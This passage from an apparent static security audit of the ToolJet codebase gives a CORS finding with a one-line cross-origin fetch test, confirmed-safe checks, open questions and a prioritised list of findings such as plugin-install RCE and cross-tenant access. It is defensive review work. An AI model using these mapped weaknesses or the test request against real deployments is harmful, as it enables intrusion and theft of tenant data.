page can issue authenticated XHR against any `/api/...` endpoint as the
victim. Combined with M14 / M5 / M19 each individually amplifies the
risk.

The `tooljetHost` fallback (env unset) is safer but still wraps a string
that Express interprets loosely; explicit list form would be safer.

**Validation plan.** Set `ENABLE_CORS=true`; from a separate origin in a
browser, fire `fetch('/api/data-queries/X/run', { credentials: 'include' })`
and observe `200`.

---

## 3. Non-findings — checked and confirmed safe (or not exploitable as feared)

These came up during the walk and were *not* flagged in the prior
artifacts. They are recorded so the next reviewer doesn't repeat the work.

- **`folders/service.ts:deleteFolder`** correctly scopes to
  `organizationId` (lines 53-58). Only `updateFolder` is broken (M10).
- **`apps/repository.ts:findById`** accepts an `organizationId` parameter
  and uses it in the WHERE clause (`apps/repository.ts:55-64`). The bug
  is in `app-auth.guard.ts` slug lookup (M6 / SAST A3), not in the
  primary repository.
- **`organization-constants/repository.ts`** and
  **`organization-themes/repository.ts`** every find-* method correctly
  scopes by `organizationId`. (Sweep on 2026-04-26.)
- **`data-sources/repository.ts:allGlobalDS`** filters by
  `organization_id` at line 67. The TJDB sample data source query at
  line 95-98 also includes `organizationId`. The vulnerable path is the
  `findById(dataSourceId)` helper (M1).
- **Stripe webhook guard** at `organization-payments/guards/stripe-webhook.guard.ts`
  uses the proper Stripe SDK `constructEvent`, not string equality. This
  is the *correct* template for the workflow webhook (M7) to follow.
- **NestJS `AllExceptionsFilter`** does not return stack traces in the
  response body (`server/src/modules/app/filters/all-exceptions-filter.ts:23-64`).
  Errors are logged server-side only. No stack-trace leakage.
- **PostgREST proxy JWT** is signed `expiresIn: '1m'`, role
  `user_<organizationId>` (`tooljet-db/services/postgrest-proxy.service.ts:216-247`),
  per-request. No session-replay surface even with PGRST_JWT_SECRET
  exposure beyond a 60-second window.
- **Lockbox encryption.** AES-256-GCM with a per-column HKDF-derived
  subkey (`encryption/service.ts:47-56`). Construction is sound
  (RECON.md §3.5). The risks are operational (default `LOCKBOX_MASTER_KEY`,
  unhashed reset/invite tokens, plaintext webhook tokens) — see M9, M17.
- **Plugin uninstall (`plugins/service.ts:remove`)** correctly checks for
  in-use queries before deletion. No "delete-then-orphan-credentials"
  race.
- **Health endpoints** at `/health` and `/api/health` return only
  `{ works: 'yeah' }` — no version/build leakage in the response body
  (the startup logs do, but those are not public).
- **External-apis CE controller** (`external-apis/controller.ts:10-56`)
  applies `ExternalApiSecurityGuard` *before* the
  `NotImplementedException` handler. The 403 path runs first when the
  feature is disabled; only operators with `ENABLE_EXTERNAL_API=true`
  *and* an EE license see 501. Not a CE auth-bypass.
- **CRM module** (`server/src/modules/CRM/`) has no exposed routes in CE.
- **Logout** clears the cookie *and* deletes the session row
  (`session/service.ts:37`). No logout-survives-revoke.

---

## 4. Open questions requiring customer confirmation

The audit is static-only; the following require either DB inspection,
DAST, or production telemetry to resolve.

1. **Plugin install gate.** Is `MODULE_INFO[plugins][INSTALL]` admin-only
   *and* opted out of `shouldNotSkipPublicApp`? Customer confirm by
   reading `server/src/modules/plugins/constants/features.ts` and the
   ability factory; we did not enumerate the full table here. (Drives
   whether M2 is admin-only RCE or anonymous RCE, M13.)

2. **Plugin install enforcement on Cloud.** `fetchPluginFilesFromS3`
   restricts to `tooljet-plugins-production.s3.us-east-2.amazonaws.com`
   only when `NODE_ENV === 'production'`. In a self-hosted deployment
   that *also* has `NODE_ENV=production`, can a workspace admin still
   pass `repo` to bypass S3 and reach GitHub directly? Confirm by
   exercising the install endpoint on a production-mode container.

3. **`workflowApiToken` storage.** Confirm by looking at the column
   definition on the running DB whether the column is encrypted, hashed,
   or plaintext. The code-level evidence (M17) is "comparison via
   `===` on `workflowApp.workflowApiToken`", which strongly implies
   plaintext, but a `@Transform` decorator on the entity could decrypt
   on read; we did not see one.

4. **`users.sso_user_info` content.** Whether Git OAuth's
   `userinfoResponse` (which `git-oauth.service.ts:37-42` returns,
   including `access_token`) lands verbatim in the DB column, or
   whether a redaction step strips it before storage. Need to read the
   `findOrCreateUser` path (`auth/util.service.ts`) to confirm.

5. **`MODULE_INFO` table audit.** The decisive question for M5 is "which
   features lack `shouldNotSkipPublicApp`?". A 30-line script (collect
   every feature constant; print missing flags) will give the full list
   in stage 4.

6. **`tj-workspace-id` validation.** `jwt.strategy.ts:62-83` validates
   the header against the JWT's `organizationIds`. Confirm by code read
   that `organizationIds` is **server-issued at JWT mint time** (it is —
   `session/util.service.ts:generateLoginResultPayload` and friends),
   and that it cannot be self-grown by accepting an additional
   organization mid-session without a re-login.

7. **Audit-log read scope.** Whether audit-log read endpoints honor
   `organizationId` strictly or if super-admins can read across orgs
   (probably the latter). If super-admins read M18's plaintext-credential
   audit rows, the blast radius is the union of "instance super-admins
   plus anyone they trust to query the DB".

8. **PAT revocation propagation.** Whether deleting a row from
   `user_personal_access_tokens` immediately invalidates a session
   built from that PAT. Need to read `session/util.service.ts:isPatLogin`
   plus the JWT validation chain.

9. **Bundle-aware `getQueryVariables` re-entry.** Whether
   `bundleContent` (M3 mitigation path) is mandatory for every
   user-controlled template, or whether some entry points still call
   `resolveCode` without a bundle and inadvertently rely on the open
   `require` callback path. Best answered by walking every call site.

10. **`USER_SESSION_EXPIRY` cap.** Whether there is any hard upper
    bound on `USER_SESSION_EXPIRY`. We did not find one. Customer
    deployments could set `USER_SESSION_EXPIRY=5258880` (10 years) and
    the server would honour it. Combined with the 2-year cookie
    `maxAge`, that is effectively unrevocable absent server-side
    session deletion.

11. **EE source review.** Workflow webhook controller, AI module,
    SCIM, SAML/OIDC config endpoints all live in `server/ee/`, which is
    empty in this clone. Several findings (M7, M8) extend into EE
    territory — the EE source must be brought into scope to finalize
    severity.

---

## 5. Validation priority summary (for stage 4)

**P0 — start here, in this order**

`M1` cross-tenant data-source action; `M2` plugin install RCE; `M3`/`M4`
isolated-vm `require` callback + global aliasing; `M5`/`M6` public-app
bypass + slug stamping; `M14` Set-Cookie tossing; `M22` Math.random
password + log of random bytes; `M23` Bull-Board no default; `M26`
CORS reflection.

**P1 — same audit cycle**

`M7` workflow webhook (HMAC + timing + replay); `M8` OAuth state +
SSO host; `M9` reset/invite token hygiene; `M10` folder cross-tenant
update; `M11` editor-publish slug squat; `M15` cookie-name filter
weakness; `M16` SSO userinfo plaintext; `M17` workflowApiToken
plaintext; `M18` audit-log credential leak; `M19` file serve
header-injection + MIME confusion.

**P2 — background**

`M12` allowRoleChange bulk promotion; `M20` invitee accept after
demotion; `M21` group-removal session survival; `M24`
`setup-super-admin` resurrection; `M25` `Secure` cookie behind a TLS
terminator.

---

*This file is the manual-review companion to `RECON.md` and `SAST.md`.
Each `Mn` entry should be revisited in stage 4 with a working PoC or a
"not exploitable" annotation justified against the validation plan.*
